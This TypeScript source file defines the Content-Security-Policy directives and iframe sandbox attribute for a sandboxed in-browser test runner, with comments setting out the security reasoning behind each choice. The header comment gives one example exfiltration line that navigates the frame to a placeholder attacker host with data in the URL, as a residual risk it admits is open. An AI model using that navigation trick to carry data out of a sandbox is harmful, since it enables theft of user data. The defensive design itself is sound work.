/**
 * The **test-realm per-frame Content-Security-Policy** — the network-denial half of
 * `run_tests`'s execution realm (roadmap R3-222 Phase 1;
 * `plans/in-browser-test-runner/01-execution-realm.mdx` decision D1).
 *
 * WHY IT LIVES HERE, next to `m3Csp.ts`: same reason. The code runs *inside this
 * document*, so the only place a per-frame policy can be attached is the frame's own
 * document, delivered as a `<meta http-equiv>` so it is verifiable on
 * `local.immediately.run` and not only behind prod hosting headers.
 *
 * ### Why this is `connect-src 'none'` where M3 is not
 *
 * `m3Csp.ts` documents at length why the M3 policy *cannot* be a literal `'none'`: an
 * M3 app shares its document with the **bundler**, so denying `connect-src` would break
 * dependency resolution. **That constraint does not exist here.** The test realm never
 * bundles anything: it is seeded, over `postMessage`, with modules that were ALREADY
 * transpiled by the kernel's Babel worker (CS-1 pure transform — it never executes
 * caller code). So the realm needs no network at all, and gets none.
 *
 * That is the whole security claim of Phase 1, and it is why a test body cannot be an
 * exfiltration channel: it holds no fs port, no catalog channel, and no way to reach the
 * network. `HANDOFF` Angle 2c named all three.
 *
 * ### What a policy cannot do, and is not claimed to
 *
 * The same residual `m3Csp.ts` books applies: frame **self-navigation**
 * (`location = 'https://attacker/?d=…'`) is not CSP-blockable — `navigate-to` was
 * dropped from CSP3. Here it is a much smaller residual than in the M3 case, because
 * the realm has nothing worth exfiltrating: it never sees a secret, a mount, or the
 * user's data — only the app's own already-public source. Named, not claimed closed.
 */

/**
 * The test realm's policy, directive by directive.
 *
 * `script-src` is deliberately permissive: the realm exists to RUN the app's compiled
 * test code. This is an **egress** control, not a code-execution control — the
 * code-execution containment is the opaque origin and the absence of any handle, not
 * this header.
 */
export const TEST_REALM_CSP_DIRECTIVES: ReadonlyArray<readonly [string, readonly string[]]> = [
  ['default-src', ["'none'"]],
  // `'self'` is REQUIRED, and it took a drill run to see why: this document loads its
  // own bundled entry script, and without `'self'` the browser blocks it — leaving a
  // realm that answers nothing at all. An opaque-origin document still resolves `'self'`
  // against its own URL in Chrome, which is the same posture `m3.html` has run in
  // production since R3-234. It is not an egress hole: `connect-src` and `img-src` stay
  // `'none'`, so a same-origin script load carries nothing out.
  //
  // Inline + blob so the seeded modules can be evaluated; `data:` is NOT here — a
  // `data:` script URL is the shortest path to smuggling something the seeder did not
  // send, and nothing in this realm needs one.
  ['script-src', ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'blob:']],
  // A CPU-bound test runs in an inner Worker so a runaway spins a thread the realm can
  // terminate without tearing the outer frame down (plan 01, "Bounding"). `'self'`
  // because the worker is a bundled chunk on this origin, `blob:` for a generated one.
  ['worker-src', ["'self'", 'blob:']],
  // THE line. No fetch, no XHR, no WebSocket, no beacon, no EventSource.
  ['connect-src', ["'none'"]],
  // Pixel/CSS/font exfil channels, closed explicitly rather than left to `default-src`
  // so the intent survives someone adding a directive above.
  ['img-src', ["'none'"]],
  ['media-src', ["'none'"]],
  ['font-src', ["'none'"]],
  ['style-src', ["'unsafe-inline'"]],
  ['frame-src', ["'none'"]],
  ['child-src', ["'self'", 'blob:']],
  ['object-src', ["'none'"]],
  ['base-uri', ["'none'"]],
  ['form-action', ["'none'"]],
];

/** The serialized policy, as it appears in `test-realm.html`. */
export const buildTestRealmCsp = (): string =>
  TEST_REALM_CSP_DIRECTIVES.map(([name, sources]) => `${name} ${sources.join(' ')}`).join('; ');

/**
 * The `sandbox` attribute the HOST must set on the realm iframe.
 *
 * `allow-scripts` and nothing else. Notably ABSENT — and each absence is the point:
 *  - `allow-same-origin` → the realm is an **opaque origin**, so it has no access to
 *    the host's storage, cookies or DOM, and `window.parent` reads give nothing.
 *  - `allow-forms` / `allow-popups` / `allow-top-navigation` → no navigation-shaped
 *    egress the CSP cannot reach.
 *
 * Exported so the host cannot drift from it: site-main's controller reads this value
 * rather than restating the string.
 */
export const TEST_REALM_SANDBOX_ATTR = 'allow-scripts';
